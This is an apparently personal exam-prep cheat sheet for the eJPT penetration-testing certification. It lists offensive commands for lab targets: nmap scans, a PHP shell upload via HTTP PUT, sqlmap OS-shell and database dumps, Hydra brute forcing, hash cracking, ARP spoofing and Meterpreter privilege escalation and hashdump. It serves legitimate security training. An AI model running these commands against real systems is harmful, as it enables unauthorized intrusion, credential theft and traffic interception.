eJPT EXAM Prep and command/tools list 


To use these commands, make sure to:

Replace ‘10.10.10.10’ with the relevant IP address
Replace ‘port’ with the relevant port number
Replace /path/to/x with the relevant path to the relevant file

Routing/Pivoting
One thing I am almost sure you will have to do is set up IP routing and routing tables. There are plenty of resources available online for this, but the course content itself seemed to be pretty lacking here.

ip route - prints the routing table for the host you are on
ip route add ROUTETO via ROUTEFROM - add a route to a new network if on a switched network and you need to pivot

Enumeration
Enumeration (Whois)
whois
whois site.com
Enumeration (Ping Sweep)
fping -a -g 10.10.10.0/24 2>/dev/null
nmap -sn 10.10.10.0/24
Nmap Scans
OS Detection
nmap -Pn -O 10.10.10.10
Nmap Scan (Quick)
nmap -sC -sV 10.10.10.10
Nmap Scan (Full)
nmap -sC -sV -p- 10.10.10.10
Nmap Scan (UDP Quick)
nmap -sU -sV 10.10.10.10
Nmap output file (-oN)
nmap -sn 10.10.10.0/24 -oN hosts.nmap
To filter out just IPs from the nmap scan results
cat hosts.nmap | grep for | cut -d " " -f 5  
Other nmap scan useful during exam
nmap -sV -Pn -T4 -A -p- -iL hosts.nmap -oN ports.nmap
nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
Web Applications
The following commands could be useful when enumerating and attacking web applications. Again, make sure you understand what each one does rather than blindly throwing them at the machine in question.

Banner Grabbing
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
OpenSSL for HTTPS services
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
Httprint
httprint -P0 -h 10.10.10.10 -s /path/to/signaturefile.txt
HTTP Verbs
GET, POST, HEAD, PUT, DELETE, OPTIONS
Use the OPTIONS verb to see what other verbs are available

nc 10.10.10.10 80
OPTIONS / HTPP/1.0
You can use HTTP verbs to upload a php shell. Find the content length, then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command.

wc -m shell.php
x shell.php

PUT /shell.php
Content-type: text/html
Content-length: x
Directory and File Scanning
My preferred tool at the moment is dirsearch, I find it to to be fast and easy to use. For a more in depth scan, use gobuster and include a large wordlist.

dirsearch.py -u http://10.10.10.10 -e *
gobuster -u 10.10.10.10 -w /path/to/wordlist.txt
Advanced Google Searches Not really necessary, but useful to know all the same.

site:
intitle:
inurl:
filetype:
AND, OR, &, |, -
Cross Site Scripting (XSS)
The general steps I use to find and test XSS are as follows:

Find a reflection point
Test with tag
Test with HTML/JavaScript code (alert('XSS'))
Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post
SQLMap
sqlmap -u http://10.10.10.10 -p parameter
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
sqlmap -u http://10.10.10.10 --os-shell
sqlmap -u http://10.10.10.10 --dump
System Attacks
The other type of ‘attack’ you will be doing are system attacks. Make sure you understand why/how to brute force types of services and hashes, as well as basic metasploit usage.

Password Attacks
Unshadow
This prepares a file for use with John the Ripper

unshadow passwd shadow > unshadow
Hash Cracking
john -wordlist /path/to/wordlist -users=users.txt hashfile
Network Attacks
Brute Forcing with Hydra replace ‘ssh’ with any relevant service

hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
hydra -L users.txt -P pass.txt telnet://10.10.10.10
Windows Shares Using Null sessions
nmblookup -A 10.10.10.10
smbclient -L //10.10.10.10 -N (list shares)
smbclient //10.10.10.10/share -N (mount share)
enum4linux -a 10.10.10.10
ARP spoofing
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
Metasploit
Metasploit is a very useful tool for penetration testers, and I’d recommend going through a Metasploitable for an effective, hands on way to learn about Metasploit. There are plenty of guides and walkthroughs available to learn from. Doing even part of a Metasploitable box will more than prepare you for the Metasploit usage required here.

Basic Metasploit Commands
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
Meterpreter
The below are some handy commands for use with a Meterpreter session. Again, I’d recommend going through a Metasploitable or doing some extra study here.

background
sessions -l
sessions -i 1
sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac
download x /root/
upload x C:\\Windows
shell
use post/windows/gather/hashdump
